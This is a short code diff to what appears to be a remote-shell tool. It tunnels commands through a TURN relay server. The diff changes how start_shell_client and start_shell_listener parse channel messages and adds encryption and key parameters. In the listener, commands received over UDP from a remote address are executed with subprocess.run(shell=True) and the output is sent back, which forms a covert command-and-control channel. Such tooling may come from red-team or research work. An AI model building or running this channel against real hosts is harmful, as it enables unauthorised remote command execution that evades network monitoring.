@@ -307,7 +307,7 @@ def start_shell_client(turn_server, turn_port, encrypted, verbose):
                         print(f"Response (hex): {response.hex()}")
                         _read_server_response(response)
                         
-                    print(_parse_channel_response(response, verbose))
+                    _parse_channel_response(response, verbose, encrypted, "NULL")
             except Exception as e:
                 print(f"Socket error: {e}")
 
@@ -366,7 +366,7 @@ def start_shell_listener(turn_server, turn_port, encrypted, verbose):
                 response, addr = sock.recvfrom(4096)
                 print(f"Received command from {addr} at {time.strftime('%H:%M:%S')}")
 
-                command = response.strip()
+                command = _parse_channel_response(response, verbose, encrypted, "NULL")
                 result = subprocess.run(command, shell=True, capture_output=True, text=True)
                 output = result.stdout if result.stdout else result.stderr
                 output = output.strip() if output else "EXECUTION WITH NO OUTPUT..."
@@ -605,7 +605,7 @@ def _create_turn_connection(sock, TURN_SERVER, channel_number, verbose):
 # ------------------------------------
 # Helper Function: Parse Command Response
 # ------------------------------------
-def _parse_channel_response(response,verbose, one, two):
+def _parse_channel_response(response,verbose, encrypted, key):
     channel_number, length = struct.unpack_from("!HH", response, 0)
     message = response[4:4+length]  # Slice the message portion
     # if encrypted:
